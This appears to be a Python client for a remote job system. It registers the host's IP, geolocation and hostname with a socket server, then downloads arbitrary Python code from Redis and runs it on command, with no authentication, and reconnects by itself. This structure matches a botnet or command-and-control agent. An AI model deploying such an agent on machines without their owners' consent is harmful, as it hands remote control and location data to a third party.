import socket
import json
import os
import requests
import time
import redis
import subprocess

def get_code_from_redis(redis_key, r):
    code = r.get(redis_key)
    # code là bytes, decode nó thành str utf-8
    return code.decode()

def get_ip_info():
    response = requests.get('https://ipinfo.io')
    data = response.json()
    return {
        'ip': data.get('ip'),
        'city': data.get('city'),
        'country': data.get('country'),
        'hostname': socket.gethostname(),
        'lat': data.get('loc').split(',')[0],
        'lon': data.get('loc').split(',')[1]
    }

def run_code(redis_key, r):
    code = get_code_from_redis(redis_key, r)
    # kiểm tra thư mục logs có tồn tại không
    if not os.path.exists('logs'):
        os.makedirs('logs')
    name_file = f'logs/{time.time()}.py'
    with open(name_file, 'w', encoding='utf-8') as f:
        f.write(code)
    # thực thi code
    os.system(f'python {name_file} > {name_file}.log')
    
            
def connect():
    # đọc thông tin từ file config
    with open('config.json', 'r', encoding='utf-8') as f:
        data = json.loads(f.read())
        ip_socket = data['ip_socket']
        port_socket = int(data['port_socket'])
        ip_redis = data['ip_redis']
        port_redis = int(data['port_redis'])
    r = redis.Redis(host=ip_redis, port=port_redis, db=0)
    server_address = (ip_socket, port_socket)
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(server_address)
    ip_info = get_ip_info()
    command = {
        'cmd': 'add',
        'result': {
            'name': os.name,
            'ip': ip_info['ip'],
            'city': ip_info['city'],
            'country': ip_info['country'],
            'hostname': ip_info['hostname'],
            'lat': ip_info['lat'],
            'lon': ip_info['lon']
        }
    }
    json_command = json.dumps(command)
    client_socket.sendall(json_command.encode())

    cmd_hello = f"""
🚀🚀🚀 Máy chủ {command['result']['hostname']} đã tham gia hệ thống thành công 🚀🚀🚀


⠀⡀⠤⡀⠄⠀⠀⠀⢀⠀⠆⢠⣀⠀⠀⢀⣅⠤⠀⠀⠀⠀⠀⢀⠠⢄⠠⠀
⠀⡄⠐⡄⠂⠀⠀⢠⢡⡌⢣⣿⣿⣿⣾⣿⣿⡗⡄⢡⠀⡄⠀⢡⠀⢣⠈⠀
⠈⣄⢙⡌⢃⠉⡈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡈⢀⢡⡘⣇⠙⡈
⠈⠆⣉⠄⡁⠀⣈⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣈⠀⠱⢈⡧⢈⠀
⠀⡁⠤⡀⠄⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⣿⣿⣿⣿⡿⢊⠀⢆⠠⠀
⠰⡀⠰⡀⠆⠀⣿⣿⣿⣿⡿⠹⣿⣿⡿⠁⢀⣾⣿⣿⣿⣿⡀⢆⠀⢇⠰⠀
⠄⠄⣙⠄⠣⣾⣿⣿⣿⣿⣧⣄⠈⠋⢀⣴⣿⣿⣿⣿⣿⣿⣧⡡⢈⡣⠈⠄
⢈⠦⣩⠄⡡⠈⢍⣿⣿⣿⣿⣿⣷⣴⣿⣿⣿⣿⣿⣿⡿⠏⠡⡱⢌⡧⢈⠄
⠀⡁⠤⡀⠄⠀⠀⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⢈⠀⢇⠠⠀
⠀⡀⠤⠀⠄⠀⠀⠀⢃⠘⡻⣿⣿⣿⣿⣿⣿⠿⠀⠃⠀⠀⠀⢀⠠⢄⠠
⢀⠄⣐⢄⡂⡀⢀⠀⡠⢐⡢⣙⢋⠀⡀⢙⠏⣐⢄⡀⡀⢀⠀⡢⢐⠢⣐⢀


"""     # cài đặt các thư viện cần thiết
    print(cmd_hello)  
    while True:
        try:
            data = client_socket.recv(1024*1024).decode()
            json_data = json.loads(data)
            print(json_data)
            if json_data['cmd'] == 'ls_clients':
                print('List clients:', json_data['result'])
            if json_data['cmd'] == 'python':
                redis_key = json_data['redis_key']
                print('Run code:', json_data['redis_key'])
                run_code(redis_key, r)
            if json_data['cmd'] == 'ping':
                client_socket.sendall(json.dumps({
                    'cmd': 'pong'
                }).encode())
            if json_data['cmd'] == 'exit':
                break
        except Exception as e:
            print(e)
            time.sleep(1)
            # đóng kết nối
            client_socket.close()
            return connect()
            
            
            
if __name__ == "__main__":
    connect()
        
                
                
                